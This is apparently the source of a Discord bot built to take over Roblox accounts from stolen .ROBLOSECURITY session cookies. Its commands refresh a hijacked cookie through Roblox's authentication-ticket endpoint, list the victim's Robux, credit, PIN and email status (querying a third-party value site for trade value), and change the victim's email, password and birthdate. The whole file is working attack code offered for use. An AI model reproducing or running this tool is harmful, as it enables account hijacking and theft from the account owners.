import requests, json, re
from datetime import datetime
import discord, base64
from discord import app_commands
from threading import Thread
from flask import Flask
from dotenv import load_dotenv
import os

# Load environment variables from .env file
load_dotenv()

app = Flask(__name__)

@app.route("/")
def home():
    return "Bot is alive!"

def run_flask():
    app.run(host="0.0.0.0", port=8080)

Thread(target=run_flask).start()

# Get the token from the environment variable
TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.default()
client = discord.Client(intents=intents)
tree = app_commands.CommandTree(client)

@client.event
async def on_ready():
    await tree.sync()
    await client.change_presence(activity=discord.Streaming(name='Made by Micxzy', url='https://www.twitch.tv/UR_TWITCH_GOES_HERE'))
    print(f"Logged in as {client.user.name} ({client.user.id})")

class Bypass:
    def __init__(self, cookie: str) -> None:
        self.cookie = cookie
    
    def start_process(self) -> str:
        self.xcsrf_token = self.get_csrf_token()
        self.rbx_authentication_ticket = self.get_rbx_authentication_ticket()
        return self.get_set_cookie()
        
    def get_set_cookie(self) -> str:
        response = requests.post(
            "https://auth.roblox.com/v1/authentication-ticket/redeem",
            headers={"rbxauthenticationnegotiation": "1"},
            json={"authenticationTicket": self.rbx_authentication_ticket}
        )
        set_cookie_header = response.headers.get("set-cookie")
        if not set_cookie_header:
            raise ValueError("An error occurred while getting the set_cookie")
        return set_cookie_header.split(".ROBLOSECURITY=")[1].split(";")[0]

    def get_rbx_authentication_ticket(self) -> str:
        response = requests.post(
            "https://auth.roblox.com/v1/authentication-ticket",
            headers={
                "rbxauthenticationnegotiation": "1", 
                "referer": "https://www.roblox.com/camel", 
                "Content-Type": "application/json", 
                "x-csrf-token": self.xcsrf_token
            },
            cookies={".ROBLOSECURITY": self.cookie}
        )
        ticket = response.headers.get("rbx-authentication-ticket")
        if not ticket:
            raise ValueError("An error occurred while getting the rbx-authentication-ticket")
        return ticket
        
    def get_csrf_token(self) -> str:
        response = requests.post(
            "https://auth.roblox.com/v2/logout", 
            cookies={".ROBLOSECURITY": self.cookie}
        )
        xcsrf_token = response.headers.get("x-csrf-token")
        if not xcsrf_token:
            raise ValueError("An error occurred while getting the X-CSRF-TOKEN. Could be due to an invalid Roblox Cookie")
        return xcsrf_token

@tree.command(name="bypass", description="Bypass the Roblox cookie")
@app_commands.describe(cookie="Enter the cookie you want to bypass")
async def bypass_cookie(interaction: discord.Interaction, cookie: str):
    await interaction.response.defer(ephemeral=True)
    try:
        bypass = Bypass(cookie)
        new_cookie = bypass.start_process()
        await interaction.followup.send(f"Successfully bypassed cookie:\n```{new_cookie}```")
    except Exception as e:
        await interaction.followup.send(f"An error occurred: {str(e)}")

@tree.command(name="checkcookie", description="Check roblox cookies")
@app_commands.describe(cookie="Enter the cookie you want to check")
async def check_cookie(interaction: discord.Interaction, cookie: str):
    await interaction.response.defer(ephemeral=True)

    session = requests.Session()
    def get_xcsrf(cookie):
        try:
            xsrf_request = requests.post('https://auth.roblox.com/v2/logout', cookies={'.ROBLOSECURITY': cookie})
            if xsrf_request.status_code == 403 and "x-csrf-token" in xsrf_request.headers:
                csrf_token = xsrf_request.headers["x-csrf-token"]
                headers = {
                    "User -Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
                    "X-CSRF-TOKEN": csrf_token,
                    "Cookie": f".ROBLOSECURITY={cookie}"
                }
                return headers
        except Exception as e:
            print("Error:", str(e))
            return None
    
    headers = get_xcsrf(cookie)
    if headers is None:
        await interaction.followup.send(f"Invalid cookie provided.")
        return
    
    session.headers = headers
    response1 = session.get("https://users.roblox.com/v1/users/authenticated").json()
    if not response1["id"]:
        await interaction.followup.send(f"Cookie is not valid. Please check your cookie.")
        return
    userid = response1["id"]
    username = response1["name"]
    displayname = response1["displayName"]

    ava = session.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={userid}&size=420x420&format=Png&isCircular=false").json()
    avatarurl = ava["data"][0]["imageUrl"]

    rap = requests.get(f"https://spade.mgui.lol/endpoint/roblox/rap?userid={userid}").json()["TotalRAP"]
    robux = session.get("https://economy.roblox.com/v1/user/currency").json()["robux"]
    credit = session.get("https://billing.roblox.com/v1/credit").json()["balance"]
    pin = session.get("https://auth.roblox.com/v1/account/pin").json()["isEnabled"]
    email = session.get("https://accountsettings.roblox.com/v1/email").json()["verified"]
    premium_data = session.get(f"https://premiumfeatures.roblox.com/v1/users/{userid}/subscriptions").json()
    if "subscriptionProductModel" in premium_data and premium_data["subscriptionProductModel"]:
        renewal_date = premium_data.get("renewal")  # Get renewal date
        if renewal_date:
            formatted_date = datetime.strptime(renewal_date, "%Y-%m-%dT%H:%M:%S.%fZ").strftime("%Y/%m/%d")
            membership_status = f"Will renew at {formatted_date}"
        else:
            membership_status = "Premium but no renewal date found"
    else:
        membership_status = "Non Premium"

    sum = session.get(f"https://economy.roblox.com/v2/users/{userid}/transaction-totals?timeFrame=year&transactionType=summary&limit=100").json()
    total_robux = (
        sum.get("salesTotal", 0) +
        sum.get("affiliateSalesTotal", 0) +
        sum.get("groupPayoutsTotal", 0) +
        sum.get("currencyPurchasesTotal", 0) +
        sum.get("premiumStipendsTotal", 0) +
        sum.get("tradeSystemEarningsTotal", 0) +
        sum.get("tradeSystemCostsTotal", 0) +
        sum.get("premiumPayoutsTotal", 0) +
        sum.get("groupPremiumPayoutsTotal", 0) +
        sum.get("developerExchangeTotal", 0) +
        sum.get("pendingRobuxTotal", 0) +
        sum.get("incomingRobuxTotal", 0) +
        sum.get("outgoingRobuxTotal", 0) +
        sum.get("individualToGroupTotal", 0) +
        sum.get("csAdjustmentTotal", 0)
    )

    pendingrobux = sum.get("pendingRobuxTotal", 0)

    join_date = session.get(f"https://users.roblox.com/v1/users/{userid}").json()["created"]
    dt = datetime.strptime(join_date, "%Y-%m-%dT%H:%M:%S.%fZ")
    date = dt.strftime("%Y-%m-%d %H:%M:%S")

    followers = session.get(f"https://friends.roblox.com/v1/users/{userid}/followers/count").json()["count"]
    friends = session.get(f"https://friends.roblox.com/v1/users/{userid}/friends/count").json()["count"]

    cook = discord.Embed(title=f'**Yey A Valid Cookie 🍪**', color=0x42be8f)
    cook.set_thumbnail(url=f'{avatarurl}')
    cook.add_field(name="Profile Link:", value=f'**[Click Here](https://www.roblox.com/users/{userid }/profile)**', inline=False)
    cook.add_field(name="Username👀:", value=f'```{username}```', inline=True)
    cook.add_field(name="User ID:🔍", value=f'```{userid}```', inline=True)
    cook.add_field(name="Display Name👀:", value=f'```{displayname}```', inline=True)
    cook.add_field(name="Verified Email🔐:", value=f'```{email}```', inline=True)
    cook.add_field(name="Premium💎:", value=f'```{membership_status}```', inline=True)
    cook.add_field(name="Pin Enabled🔐:", value=f'```{pin}```', inline=True)
    cook.add_field(name="Robux💰:", value=f'```{robux}```', inline=True)
    cook.add_field(name="Pending-Robux⌛:", value=f'```{pendingrobux}```', inline=True)
    cook.add_field(name="Rap📈:", value=f'```{rap}```', inline=True)
    cook.add_field(name="Credit💰:", value=f'```{credit}```', inline=True)
    cook.add_field(name="Date Created🧒:", value=f'```{date}```', inline=True)
    cook.add_field(name="Friends😎:", value=f'```{friends}```', inline=True)
    cook.add_field(name="Followers😎:", value=f'```{followers}```', inline=True)
    cook.add_field(name="Summary 💵:", value=f'```{total_robux}```', inline=True)

    await interaction.followup.send(embed=cook)

@tree.command(name="force_13", description="Remove User's connected email")
@app_commands.describe(cookie="enter your target cookie")
@app_commands.describe(password="enter your account password")
async def force_13plus(interaction: discord.Interaction, cookie: str, password: str):
    await interaction.response.defer(ephemeral=True)
    session = requests.Session()
    def get_xcsrf(cookie):
        try:
            xsrf_request = requests.post('https://auth.roblox.com/v2/logout', cookies={'.ROBLOSECURITY': cookie})
            if xsrf_request.status_code == 403 and "x-csrf-token" in xsrf_request.headers:
                csrf_token = xsrf_request.headers["x-csrf-token"]
                headers = {
                    "User -Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
                    "X-CSRF-TOKEN": csrf_token,
                    "Cookie": f".ROBLOSECURITY={cookie}"
                }
                return headers
        except Exception as e:
            print("Error:", str(e))
            return None
    
    headers = get_xcsrf(cookie)
    if headers is None:
        await interaction.followup.send(f"Invalid cookie provided.")
        return
    
    session.headers = headers
    response1 = session.get("https://users.roblox.com/v1/users/authenticated").json()
    if not response1["id"]:
        await interaction.followup.send(f"Cookie is not valid. Please check your cookie.")
        return
    
    res1 = session.post("https://users.roblox.com/v1/birthdate", 
                    json={
                        "birthMonth":2,
                        "birthDay":9,
                        "birthYear":2013
                    })
    challengeid = res1.headers.get("Rblx-Challenge-Id")

    tokenres = session.post("https://apis.roblox.com/reauthentication-service/v1/token/generate",
                        json={
                            "password": password
                        })
    if tokenres.status_code!= 200:
        await interaction.followup.send(f"Failed to generate token. Please check your password.")
        return
    
    token = tokenres.json()["token"]

    continueres = session.post("https://apis.roblox.com/challenge/v1/continue",
                           json={
                               "challengeId": challengeid,
                               "challengeMetadata": json.dumps({"reauthenticationToken": token}),
                               "challengeType": "reauthentication"
                           })
    if continueres.status_code!= 200:
        await interaction.followup.send(f"Please check your password.")
        return
    session.headers["Rblx-Challenge-Id"] = challengeid
    session.headers["Rblx-Challenge-Metadata"] = base64.b64encode(json.dumps({"reauthenticationToken": token}).encode()).decode()
    session.headers["rblx-challenge-type"] = "reauthentication"

    res69 = session.post("https://users.roblox.com/v1/birthdate", 
                    json={
                        "birthMonth":2,
                        "birthDay":9,
                        "birthYear":2013
                    })
    if res69 .status_code != 200:
        await interaction.followup.send(f"Failed to change birthday. Please try again.")
        return
    
    await interaction.followup.send(f"Successfully removed connected email.")

@tree.command(name="change_email", description="Change the email address")
@app_commands.describe(cookie="enter your target cookie")
@app_commands.describe(new_email="enter your new email")
@app_commands.describe(password="Enter your password")
async def change_email(interaction: discord.Interaction, cookie: str, new_email: str, password: str):
    await interaction.response.defer(ephemeral=True)
    session = requests.Session()
    def get_xcsrf(cookie):
        try:
            xsrf_request = requests.post('https://auth.roblox.com/v2/logout', cookies={'.ROBLOSECURITY': cookie})
            if xsrf_request.status_code == 403 and "x-csrf-token" in xsrf_request.headers:
                csrf_token = xsrf_request.headers["x-csrf-token"]
                headers = {
                    "User -Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
                    "X-CSRF-TOKEN": csrf_token,
                    "Cookie": f".ROBLOSECURITY={cookie}"
                }
                return headers
        except Exception as e:
            print("Error:", str(e))
            return None
    
    def is_valid_email(email):
        pattern = r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$'
        return re.match(pattern, email) is not None
    
    headers = get_xcsrf(cookie)
    if headers is None:
        await interaction.followup.send(f"Invalid cookie provided.")
        return
    
    if not is_valid_email(new_email):
        await interaction.followup.send(f"Invalid email format.")
        return
    
    session.headers = headers
    res1 = session.post("https://accountsettings.roblox.com/v1/email",
                        json={"password": password, "emailAddress": new_email})
    if res1.status_code != 200:
        await interaction.followup.send(f"Failed to change email. Please check your password and try again.")
        return
    
    await interaction.followup.send(f"Successfully changed email address.")

@tree.command(name="change_password", description="Change password")
@app_commands.describe(cookie="enter your target cookie")
@app_commands.describe(old_password="enter your old password")
@app_commands.describe(new_password="enter your new password")
async def change_password(interaction: discord.Interaction, cookie: str, old_password: str, new_password: str):
    await interaction.response.defer(ephemeral=True)
    session = requests.Session()
    def get_xcsrf(cookie):
        try:
            xsrf_request = requests.post('https://auth.roblox.com/v2/logout', cookies={'.ROBLOSECURITY': cookie})
            if xsrf_request.status_code == 403 and "x-csrf-token" in xsrf_request.headers:
                csrf_token = xsrf_request.headers["x-csrf-token"]
                headers = {
                    "User -Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
                    "X-CSRF-TOKEN": csrf_token,
                    "Cookie": f".ROBLOSECURITY={cookie}"
                }
                return headers
        except Exception as e:
            print("Error:", str(e))
            return None
    
    headers = get_xcsrf(cookie)
    if headers is None:
        await interaction.followup.send(f"Invalid cookie provided.")
        return
    
    session.headers = headers

    res1 = session.post("https://auth.roblox.com/v2/user/passwords/change", json={
        "currentPassword": old_password,
        "newPassword": new_password
    })
    if res1.status_code != 200:
        await interaction.followup.send(f"Failed to change password. Please check your old password and try again.")
        return
    
    await interaction.followup.send(f"Successfully changed password.")

@tree.command(name="help", description="show all available commands.")
async def help_command(interaction: discord.Interaction):
    await interaction.response.send_message(
        embed=discord.Embed(
            title="Help",
            description="Here are all available commands:",
            color=0x2a2a2a
        ).add_field(
            name="/checkcookie",
            value="check cookie if valid",
            inline=False
        ).add_field(
            name="/remove_email",
            value="Remove connected email address",
            inline=False
        ).add_field(
            name="/change_email",
            value="Change email address",
            inline=False
 ).add_field(
            name="/change_password",
            value="Change password",
            inline=False
        ).add_field(
            name="/bypass",
            value="Bypass the Roblox cookie",
            inline=False
        ).add_field(
            name="/help",
            value="Show all available commands",
            inline=False
        )
    )

client.run(TOKEN)
